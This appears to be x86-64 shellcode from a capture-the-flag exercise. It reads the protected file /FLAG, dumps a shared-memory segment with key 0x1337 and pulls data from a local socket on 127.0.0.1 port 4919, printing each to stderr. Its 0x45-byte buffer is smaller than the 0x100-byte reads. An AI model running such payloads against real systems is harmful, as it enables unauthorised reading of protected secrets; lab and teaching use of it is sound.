getflag: # Syscall arguments are put in the registers rax, rdi, rsi, rdx, r10, r8 and r9, in that order.
	mov rax, SYS_open
	lea rdi, [rip+.filename]
	mov rsi, O_RDONLY
	syscall # syscall('SYS_open', "/FLAG", O_RDONLY)
	mov rdi, rax
	mov rax, SYS_read
	lea rsi, [rip+.buffer]
	mov rdx, 0x100
	syscall # syscall('SYS_read', open_rax, buffer, 0x100)
	mov rdx, rax
	mov rax, SYS_write
	mov rdi, STDERR_FILENO
	lea rsi, [rip+.buffer]
	syscall # syscall('SYS_write', STDERR_FILENO, buffer, read_rax)
	mov rax, SYS_shmget
	mov rdi, 0x1337
	mov rsi, 0
	mov rdx, 0
	syscall # syscall('SYS_shmget', 0x1337, 0, 0)
	mov rdi, rax
	mov rax, SYS_shmat
	mov rsi, 0
	mov rdx, 0x1000
	syscall # syscall('SYS_shmat', shmget_rax, 0, 0)
	mov rsi, rax
	mov rax, SYS_write
	mov rdi, STDERR_FILENO
	mov rdx, 0x45
	syscall # syscall('SYS_write', STDERR_FILENO, shmat_rax, 0x45)
	mov rdi, rsi
	mov rax, SYS_shmdt
	syscall # syscall('SYS_shmdt', write_rsi)
	mov rax, SYS_socket
	mov rdi, AF_INET
	mov rsi, SOCK_STREAM
	mov rdx, 0
	syscall # syscall('SYS_socket', AF_INET, SOCK_STREAM, 0)
	mov rdi, rax
	mov rax, SYS_connect
	lea rsi, [rip+.sockaddr]
	mov WORD PTR[rsi], AF_INET
	mov WORD PTR[rsi+2], 0x3713
	mov DWORD PTR[rsi+4], 0x0100007F
	mov rdx, 0x10
	syscall # syscall('SYS_connect', socket_rax, sockaddr, 0x10)
	mov rax, SYS_read
	lea rsi, [rip+.buffer]
	mov rdx, 0x100
	syscall # syscall('SYS_read', connect_rdi, buffer, 0x100)
	mov rdx, rax
	mov rax, SYS_write
	mov rdi, STDERR_FILENO
	lea rsi, [rip+.buffer]
	syscall # syscall('SYS_write', STDERR_FILENO, buffer, read_rax)
	ret
.filename:
	.string	"/FLAG"
.sockaddr:
	.space 0x10, 0
.buffer:
	.space 0x45, 0
